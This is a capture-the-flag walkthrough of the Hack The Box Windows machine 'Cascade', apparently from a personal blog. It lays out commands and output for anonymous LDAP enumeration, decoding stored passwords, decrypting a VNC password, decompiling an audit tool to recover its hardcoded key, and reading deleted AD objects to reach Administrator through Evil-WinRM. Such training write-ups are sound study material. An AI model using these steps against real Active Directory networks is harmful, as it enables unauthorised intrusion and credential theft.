---
permalink: /posts/HTB/Cascade
title:  "HTB Cascade"
author: Luc Kolen
description: "Cascade is a medium Windows machine on HTB"
categories:
  - CTF
  - HTB
tags:
  - HTB-Medium
  - Windows
  - SMB
  - LDAP
  - AD Recycle Bin
  - Decompilation
---

|Hack The Box|Created by|Points|
|---|---|---|
|[Link](https://www.hackthebox.eu/home/machines/profile/235)|[VbScrub](https://www.hackthebox.eu/home/users/profile/158833)|30|

# 10.10.10.182 - Cascade

- [10.10.10.182 - Cascade](#101010182---cascade)
  - [Open ports](#open-ports)
    - [TCP](#tcp)
    - [UDP](#udp)
  - [LDAP](#ldap)
  - [SMB](#smb)
  - [Privilege escalation](#privilege-escalation)
    - [CascAudit.exe](#cascauditexe)
    - [ArkSvc -> Administrator via AD Recycle Bin group](#arksvc---administrator-via-ad-recycle-bin-group)
  - [TL;DR](#tldr)

## Open ports

### TCP

```bash
luc@kali:~/HTB/Cascade$ nmap -vv --reason -Pn -A --osscan-guess --version-all -p- 10.10.10.182
```

|Port|Service|Version
|---|---|---|
88/tcp|kerberos-sec|Microsoft Windows Kerberos (server time: 2020-05-07 13:34:28Z)
389/tcp|ldap|Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
636/tcp|tcpwrapped|
3268/tcp|ldap|Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
3269/tcp|tcpwrapped|
5985/tcp|http|Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49154/tcp|msrpc|Microsoft Windows RPC
49155/tcp|msrpc|Microsoft Windows RPC
49157/tcp|ncacn_http|Microsoft Windows RPC over HTTP 1.0
49158/tcp|msrpc|Microsoft Windows RPC
49173/tcp|msrpc|Microsoft Windows RPC

### UDP

```bash
luc@kali:~/HTB/Cascade$ nmap -vv --reason -Pn -sU -A --top-ports=20 --version-all 10.10.10.182
```

|Port|Service
|---|---|---|
53/udp|domain?
123/udp|ntp?

## LDAP

```bash
luc@kali:~/HTB/Cascade$ ldapsearch -x -h 10.10.10.182 -s base
...
namingContexts: DC=cascade,DC=local
...
luc@kali:~/HTB/Cascade$ ldapsearch -x -h 10.10.10.182 -s sub -b 'DC=cascade,DC=local'
...
# Ryan Thompson, Users, UK, cascade.local
dn: CN=Ryan Thompson,OU=Users,OU=UK,DC=cascade,DC=local
...
sAMAccountName: r.thompson
...
cascadeLegacyPwd: clk0bjVldmE=
...
luc@kali:~/HTB/Cascade$ echo -n 'clk0bjVldmE=' | base64 -d;echo
rY4n5eva
```

We can find a password for the `r.thompson` account.

## SMB

```bash
luc@kali:~/HTB/Cascade$ smbmap -u r.thompson -p rY4n5eva -H 10.10.10.182
[+] IP: 10.10.10.182:445        Name: 10.10.10.182
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        Audit$                                                  NO ACCESS
        C$                                                      NO ACCESS       Default share
        Data                                                    READ ONLY
        IPC$                                                    NO ACCESS       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share
        print$                                                  READ ONLY       Printer Drivers
        SYSVOL                                                  READ ONLY       Logon server share
```

We have access to a `Data` share.

```bash
luc@kali:~/HTB/Cascade/$ mkdir smb
luc@kali:~/HTB/Cascade/$ cd smb
luc@kali:~/HTB/Cascade/smb$ mkdir data
luc@kali:~/HTB/Cascade/smb$ sudo mount //10.10.10.182/data data -o username=r.thompson
Password for r.thompson@//10.10.10.182/data:  rY4n5eva
luc@kali:~/HTB/Cascade/smb$ cd data/
luc@kali:~/HTB/Cascade/smb/data$ ls -R
.:
Contractors  Finance  IT  Production  Temps

./Contractors:
ls: reading directory './Contractors': Permission denied

./Finance:
ls: reading directory './Finance': Permission denied

./IT:
'Email Archives'   LogonAudit   Logs   Temp

'./IT/Email Archives':
Meeting_Notes_June_2018.html

./IT/LogonAudit:

./IT/Logs:
'Ark AD Recycle Bin'   DCs

'./IT/Logs/Ark AD Recycle Bin':
ArkAdRecycleBin.log

./IT/Logs/DCs:
dcdiag.log

./IT/Temp:
r.thompson  s.smith

./IT/Temp/r.thompson:

./IT/Temp/s.smith:
'VNC Install.reg'

./Production:
ls: reading directory './Production': Permission denied

./Temps:
ls: reading directory './Temps': Permission denied
luc@kali:~/HTB/Cascade/smb/data$ cat IT/Email\ Archives/Meeting_Notes_June_2018.html
...
Username is TempAdmin (password is the same as the normal admin account password).
...
luc@kali:~/HTB/Cascade/smb/data$ cat IT/Temp/s.smith/VNC\ Install.reg
...
"Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f
...
```

We can see some interesting files `./IT/Email Archives/Meeting_Notes_June_2018.html` and `./IT/Temp/s.smith/VNC Install.reg` in this `data` share as `r.thompson`. The emails gives us the username `TempAdmin` and that the password is the same as the normal admin account password. We also get a saved VNC password.

```bash
luc@kali:~/HTB/Cascade$ python2 /opt/vncpasswd.py/vncpasswd.py -H '6bcf2a4b6e5aca0f' -d
Decrypted Bin Pass= 'sT333ve2'
Decrypted Hex Pass= '7354333333766532'```
```

This saved VNC password can be decrypted by [vncpasswd.py](https://github.com/trinitronx/vncpasswd.py) so now we've credentials for `s.smith` because this credential was found in a folder with his name.

```bash
luc@kali:~/HTB/Cascade$ evil-winrm -u s.smith -p sT333ve2 -i 10.10.10.182

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\s.smith\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\s.smith\Desktop> cat user.txt
5285d40b************************
```

## Privilege escalation

```bash
*Evil-WinRM* PS C:\Users\s.smith\Desktop> cd \
*Evil-WinRM* PS C:\> dir

    Directory: C:\

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         1/9/2020   8:14 PM                inetpub
d-----        7/14/2009   4:20 AM                PerfLogs
d-r---        1/28/2020   7:27 PM                Program Files
d-r---        3/25/2020  11:30 AM                Program Files (x86)
d-----        1/15/2020   9:38 PM                Shares
d-r---        1/28/2020  11:37 PM                Users
d-----        3/25/2020  11:29 AM                Windows

*Evil-WinRM* PS C:\> cd Shares
*Evil-WinRM* PS C:\Shares> dir
Access to the path 'C:\Shares' is denied.
```

We can't access the `C:\Shares` folder contents directly.

```bash
luc@kali:~/HTB/Cascade$ smbmap -H 10.10.10.182 -u s.smith -p sT333ve2
[+] IP: 10.10.10.182:445        Name: 10.10.10.182
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        Audit$                                                  READ ONLY
        C$                                                      NO ACCESS       Default share
        Data                                                    READ ONLY
        IPC$                                                    NO ACCESS       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share
        print$                                                  READ ONLY       Printer Drivers
        SYSVOL                                                  READ ONLY       Logon server share
luc@kali:~/HTB/Cascade$ mkdir smb_steve
luc@kali:~/HTB/Cascade$ cd smb_steve
luc@kali:~/HTB/Cascade/smb_steve$ mkdir audit
luc@kali:~/HTB/Cascade/smb_steve$ sudo mount //10.10.10.182/audit$ audit -o username=s.smith
Password for s.smith@//10.10.10.182/audit$:  ********
luc@kali:~/HTB/Cascade/smb_steve$ cd audit
luc@kali:~/HTB/Cascade/smb_steve/audit$ ls -R
.:
CascAudit.exe  CascCrypto.dll  DB  RunAudit.bat  System.Data.SQLite.dll  System.Data.SQLite.EF6.dll  x64  x86

./DB:
Audit.db

./x64:
SQLite.Interop.dll

./x86:
SQLite.Interop.dll
luc@kali:~/HTB/Cascade/smb_steve/audit$ python3 -m http.server
```

We gan access to the `Audit$` share via `SMB`. We mount this share and find a Windows application. We'll start a simple webserver here to access these files on our Windows machine.

### CascAudit.exe

![Download CascAudit.exe on the Windows machine](/assets/images/HTB-Cascade/1.a%20Download%20CascAudit.exe%20on%20the%20Windows%20machine.png)

![Decompiled CascAudit.exe shows password decrypt](/assets/images/HTB-Cascade/1.b%20Decompiled%20CascAudit.exe%20shows%20password%20decrypt.png)

We copy the `CascAudit.exe` file to our Windows machine and run [JetBrains dotPeek](https://www.jetbrains.com/decompiler/) to decompile this application.

```c#
...
using (SQLiteConnection connection = new SQLiteConnection("Data Source=" + MyProject.Application.CommandLineArgs[0] + ";Version=3;"))
{
    string empty1 = string.Empty;
    string str = string.Empty;
    string empty2 = string.Empty;
    try
    {
        connection.Open();
        using (SQLiteCommand sqLiteCommand = new SQLiteCommand("SELECT * FROM LDAP", connection))
        {
            using (SQLiteDataReader sqLiteDataReader = sqLiteCommand.ExecuteReader())
            {
                sqLiteDataReader.Read();
                empty1 = Conversions.ToString(sqLiteDataReader["Uname"]);
                empty2 = Conversions.ToString(sqLiteDataReader["Domain"]);
                string EncryptedString = Conversions.ToString(sqLiteDataReader["Pwd"]);
                try
                {
                    str = Crypto.DecryptString(EncryptedString, "c4scadek3y654321");
                }
                catch (Exception ex)
                {
                    ProjectData.SetProjectError(ex);
                    Console.WriteLine("Error decrypting password: " + ex.Message);
                    ProjectData.ClearProjectError();
                    return;
                }
            }
        }
        connection.Close();
    }
...
```

This is the most important part of the code. We can see that a database file is opened and a password is decrypted using the key `c4scadek3y654321`.

We download the `Audit.db` file from the `Audit` share and update the code to read from our new file location.

```c#
using (SQLiteConnection connection = new SQLiteConnection("Data Source=C:\\Users\\User\\Downloads\\audit\\DB\\Audit.db;Version=3;"))
```

Running this updated code will have the username in `empty1` and the decrypted password in `str` when placing a breakpoint after the decrypt function call.

![ArkSvc credentials shown](/assets/images/HTB-Cascade/1.c%20ArkSvc%20credentials%20shown.png)

This results in the username `ArkSvc` and the password `w3lc0meFr31nd`.

### ArkSvc -> Administrator via AD Recycle Bin group

```bash
luc@kali:~/HTB/Cascade$ evil-winrm -u ArkSvc -p w3lc0meFr31nd -i 10.10.10.182

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\arksvc\Documents> whoami /all
...
CASCADE\AD Recycle Bin                      Alias            S-1-5-21-3332504370-1206983947-1165150453-1119 Mandatory group, Enabled by default, Enabled group, Local Group
...
*Evil-WinRM* PS C:\Users\arksvc\Documents> Get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects -properties *
...
cascadeLegacyPwd                : YmFDVDNyMWFOMDBkbGVz
CN                              : TempAdmin
...
```

We know that a `TempAdmin` account had been created and that is used the same password as the `Administrator account`. We can use the `ArkSvc` account to look for deleted objects because that account is in the `CASCADE\AD Recycle Bin` group.

```bash
luc@kali:~/HTB/Cascade$ echo -n 'YmFDVDNyMWFOMDBkbGVz' | base64 -d; echo
baCT3r1aN00dles
luc@kali:~/HTB/Cascade$ evil-winrm -u Administrator -p baCT3r1aN00dles -i 10.10.10.182

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
809da854************************
```

## TL;DR

- Find user credentials using anonymous LDAP access
- Find encrypted password in VNC file
- Decompile application to find out how it works and use it to decrypt credentials from database file
- Use AD Recycle Bin to find credentials for deleted account which uses same password as admin account
